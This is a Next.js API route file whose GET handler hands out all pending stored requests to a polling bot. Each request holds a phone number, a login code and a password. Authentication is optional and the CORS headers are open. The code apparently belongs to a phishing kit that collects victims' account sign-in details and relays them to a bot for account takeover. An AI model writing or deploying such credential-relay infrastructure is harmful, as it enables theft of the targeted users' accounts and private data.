import { NextResponse } from "next/server"
import { storage } from "../storage"

export async function GET(request: Request) {
  try {
    const origin = request.headers.get("origin")
    const authHeader = request.headers.get("X-Bot-Token")
    const envToken = process.env.BOT_TOKEN

    // Only enforce if BOT_TOKEN is set in environment
    if (envToken && authHeader !== envToken) {
      console.log("[API] ⛔ Unauthorized bot access attempt")
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        {
          status: 401,
          headers: {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type, X-Bot-Token",
          },
        },
      )
    }

    // Get all pending requests from memory
    const pendingRequests = storage.getPendingRequests()

    pendingRequests.forEach((req: any) => {
      storage.markAsDelivered(req.requestId)
    })

    // Log for debugging
    if (pendingRequests.length > 0) {
      console.log(`[API] Delivered ${pendingRequests.length} pending requests`)
    }

    const formattedRequests = pendingRequests.map((req: any) => ({
      requestId: req.requestId,
      action: req.action,
      chatId: req.chatId,
      phone: req.phone,
      code: req.code,
      password: req.password,
      data: {
        phone: req.phone,
        code: req.code,
        password: req.password,
      },
    }))

    return NextResponse.json(
      {
        success: true,
        requests: formattedRequests,
        count: formattedRequests.length,
      },
      {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type, X-Bot-Token",
        },
      },
    )
  } catch (error) {
    return NextResponse.json(
      { success: false, error: String(error) },
      {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type, X-Bot-Token",
        },
      },
    )
  }
}

export async function OPTIONS(request: Request) {
  return NextResponse.json(
    {},
    {
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, X-Bot-Token",
      },
    },
  )
}
